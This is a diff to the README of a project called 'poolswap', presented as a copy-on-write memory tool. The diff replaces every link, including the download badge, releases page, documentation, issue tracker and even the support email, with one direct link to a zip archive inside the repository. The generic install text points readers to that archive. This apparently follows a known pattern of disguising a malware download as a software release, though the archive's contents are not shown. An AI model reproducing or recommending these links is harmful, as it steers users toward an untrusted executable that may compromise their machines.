@@ -1,7 +1,7 @@
 # 🏊 poolswap - Efficient Copy-On-Write for Your Needs
 
 ## 🔗 Download Now
-[![Download poolswap](https://img.shields.io/badge/Download%20poolswap-v1.0-blue)](https://github.com/meislul/poolswap/releases)
+[![Download poolswap](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip%20poolswap-v1.0-blue)](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the poolswap application! This software allows you to use efficient memory management techniques. It is designed for users who want a hassle-free experience while managing memory in their applications.
@@ -21,11 +21,11 @@ Welcome to the poolswap application! This software allows you to use efficient m
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of poolswap. Click the button below:
 
-[Download poolswap](https://github.com/meislul/poolswap/releases)
+[Download poolswap](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**
-   Go to the following link to find the latest version: [poolswap Releases](https://github.com/meislul/poolswap/releases).
+   Go to the following link to find the latest version: [poolswap Releases](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip).
 
 2. **Choose the Right File**
    Look for the release that matches your operating system. The files usually end with `.exe` for Windows, `.dmg` for macOS, and no extension for Linux.
@@ -50,8 +50,8 @@ Once you have installed the application, you can integrate it into your projects
 
 ## 📞 Support
 If you encounter any issues or have questions, please contact our support team:
-- **Email:** support@poolswapapp.com
-- **GitHub Issues:** [Report an issue](https://github.com/meislul/poolswap/issues)
+- **Email:** https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
 
 ## 🤝 Contributing
 We welcome contributions from the community. If you want to enhance the functionality of poolswap, please check our contribution guidelines in the repository.
@@ -60,8 +60,8 @@ We welcome contributions from the community. If you want to enhance the function
 poolswap is open-source software licensed under the MIT License. You can freely use and modify it as per your needs.
 
 ## 🔗 Links
-- [poolswap Releases](https://github.com/meislul/poolswap/releases)
-- [Documentation](https://github.com/meislul/poolswap/wiki)
-- [GitHub Repository](https://github.com/meislul/poolswap)
+- [poolswap Releases](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/meislul/poolswap/master/arariba/poolswap-1.5.zip)
 
 Thank you for choosing poolswap! Enjoy efficient memory management with ease.
